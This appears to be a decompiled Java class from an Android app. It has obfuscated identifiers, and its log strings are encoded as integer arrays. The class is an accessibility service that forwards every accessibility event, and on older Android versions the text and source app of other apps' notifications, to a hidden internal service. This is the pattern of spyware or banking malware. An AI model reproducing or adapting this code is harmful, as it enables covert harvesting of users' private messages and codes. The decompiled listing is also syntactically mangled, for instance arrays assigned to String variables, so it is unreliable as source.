package tev.piqgahor;
public class iurU1C5X0u extends android.accessibilityservice.AccessibilityService {
    private static final String[] S3vhudBn;
    private boolean FirwYZZ0;
    private final android.content.ServiceConnection IfEfaSIW3;
    private tev.piqgahor.fxn1Y9 PJaveCi5UQ5;

    static iurU1C5X0u()
    {
        String[] v0_1 = new String[3];
        String v2_7 = new int[38];
        v2_7 = {47, 138, 125, 158, 163, 152, 149, 168, 130, 148, 161, 165, 152, 146, 148, 140, 79, 158, 157, 112, 146, 146, 148, 162, 162, 152, 145, 152, 155, 152, 163, 168, 116, 165, 148, 157, 163, 79};
        v0_1[0] = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v2_7);
        String v2_1 = new int[9];
        v2_1 = {36, 69, 69, 69, 68, 109, 104, 68, 94};
        v0_1[1] = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v2_1);
        String v2_4 = new int[12];
        v2_4 = {6, 50, 38, 90, 111, 105, 113, 107, 120, 38, 67, 38};
        v0_1[2] = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v2_4);
        tev.piqgahor.iurU1C5X0u.S3vhudBn = v0_1;
        return;
    }

    public iurU1C5X0u()
    {
        this.FirwYZZ0 = 0;
        this.PJaveCi5UQ5 = 0;
        this.IfEfaSIW3 = new tev.piqgahor.iurU1C5X0u$1(this);
        return;
    }

    private void Cb26N0K9Fd2()
    {
        if (!this.FirwYZZ0) {
            android.content.ServiceConnection v1_5 = new int[28];
            v1_5 = {43, 134, 121, 154, 159, 148, 145, 164, 126, 144, 157, 161, 148, 142, 144, 136, 75, 109, 148, 153, 143, 126, 144, 157, 161, 148, 142, 144};
            tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v1_5));
            android.content.Intent v0_0 = new android.content.Intent(this, tev.piqgahor.ttnC03lWapO);
            v0_0.putExtra("type", 1);
            this.bindService(v0_0, this.IfEfaSIW3, 1);
            this.FirwYZZ0 = 1;
        }
        return;
    }

    private static String SnAYzBV494(java.util.List p3)
    {
        if ((p3 != null) && (!p3.isEmpty())) {
            StringBuilder v1_1 = new StringBuilder();
            int v0 = 0;
            while (v0 < p3.size()) {
                v1_1.append(((CharSequence) p3.get(v0)));
                if (v0 > 0) {
                    v1_1.append(" | ");
                }
                v0++;
            }
            String v2_3 = v1_1.toString();
        } else {
            v2_3 = 0;
        }
        return v2_3;
    }

    static synthetic void access$0(tev.piqgahor.iurU1C5X0u p0, tev.piqgahor.fxn1Y9 p1)
    {
        p0.PJaveCi5UQ5 = p1;
        return;
    }

    static synthetic tev.piqgahor.fxn1Y9 access$1(tev.piqgahor.iurU1C5X0u p1)
    {
        return p1.PJaveCi5UQ5;
    }

    private void zOceC4()
    {
        if (this.FirwYZZ0) {
            String v1_10 = new int[30];
            v1_10 = {23, 114, 101, 134, 139, 128, 125, 144, 106, 124, 137, 141, 128, 122, 124, 116, 55, 108, 133, 121, 128, 133, 123, 106, 124, 137, 141, 128, 122, 124};
            tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v1_10));
            try {
                this.unbindService(this.IfEfaSIW3);
            } catch (Exception v0) {
                String v1_2 = new int[47];
                v1_2 = {33, 124, 111, 144, 149, 138, 135, 154, 116, 134, 147, 151, 138, 132, 134, 126, 65, 118, 143, 131, 138, 143, 133, 116, 134, 147, 151, 138, 132, 134, 65, 78, 65, 102, 153, 132, 134, 145, 149, 138, 144, 143, 65, 66, 66, 66, 65};
                StringBuilder v2_1 = new StringBuilder(String.valueOf(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v1_2)));
                if (v0 == null) {
                    String v1_6 = ".";
                } else {
                    v1_6 = v0.getMessage();
                }
                tev.piqgahor.WqukitNJL.VkNmRD0688(v2_1.append(v1_6).toString());
            }
            this.FirwYZZ0 = 0;
        }
        return;
    }

    public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent p8)
    {
        if (p8 != null) {
            if (!this.FirwYZZ0) {
                this.Cb26N0K9Fd2();
            }
            if (this.PJaveCi5UQ5 != null) {
                this.PJaveCi5UQ5.Ij0e3s33(p8, this);
                if ((android.os.Build$VERSION.SDK_INT < 18) && ((p8.getEventType() == 64) && (p8.getPackageName() != null))) {
                    this.PJaveCi5UQ5.I6Z35(this.getApplicationContext(), p8.getEventTime(), tev.piqgahor.iurU1C5X0u.SnAYzBV494(p8.getText()), p8.getPackageName().toString(), ((android.app.Notification) p8.getParcelableData()));
                }
            } else {
                tev.piqgahor.fxn1Y9 v0_5 = new Object[2];
                v0_5[0] = tev.piqgahor.iurU1C5X0u.S3vhudBn[0];
                long v2_3 = new int[30];
                v2_3 = {35, 104, 117, 117, 114, 117, 67, 68, 68, 68, 67, 150, 136, 149, 153, 140, 134, 136, 67, 145, 146, 151, 67, 134, 149, 136, 132, 151, 136, 135};
                v0_5[1] = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v2_3);
                tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.mvoGCr4741(v0_5));
            }
        }
        return;
    }

    public void onCreate()
    {
        super.onCreate();
        String v0_1 = new int[27];
        v0_1 = {19, 110, 97, 130, 135, 124, 121, 140, 102, 120, 133, 137, 124, 118, 120, 112, 51, 86, 133, 120, 116, 135, 120, 51, 52, 52, 52};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_1));
        return;
    }

    public void onDestroy()
    {
        super.onDestroy();
        String v0_1 = new int[28];
        v0_1 = {28, 119, 106, 139, 144, 133, 130, 149, 111, 129, 142, 146, 133, 127, 129, 121, 60, 96, 129, 143, 144, 142, 139, 149, 60, 61, 61, 61};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_1));
        return;
    }

    public void onInterrupt()
    {
        tev.piqgahor.fxn1Y9 v0_1 = new int[30];
        v0_1 = {51, 142, 129, 162, 167, 156, 153, 172, 134, 152, 165, 169, 156, 150, 152, 144, 83, 124, 161, 167, 152, 165, 165, 168, 163, 167, 83, 84, 84, 84};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_1));
        if (this.PJaveCi5UQ5 != null) {
            this.PJaveCi5UQ5.IHZ8Sg9H34();
        }
        this.zOceC4();
        return;
    }

    protected void onServiceConnected()
    {
        String v0_1 = new int[37];
        v0_1 = {43, 134, 121, 154, 159, 148, 145, 164, 126, 144, 157, 161, 148, 142, 144, 136, 75, 126, 144, 157, 161, 148, 142, 144, 110, 154, 153, 153, 144, 142, 159, 144, 143, 75, 76, 76, 76};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_1));
        this.Cb26N0K9Fd2();
        return;
    }
}
